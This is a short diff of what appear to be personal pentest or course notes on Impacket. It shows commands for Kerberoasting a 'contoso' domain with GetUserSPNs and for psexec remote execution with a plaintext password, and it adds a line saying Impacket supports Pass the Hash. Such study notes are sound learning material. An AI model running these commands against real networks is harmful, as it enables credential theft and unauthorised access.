@@ -8,3 +8,5 @@ impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip 10.0.0.4 'contoso.co
 impacket-psexec contoso/diplomado:password@10.0.0.21  
 To access to target machine. It if had admin it can be interesting.
 
+
+Impacket Supports Pass the Hash attack.
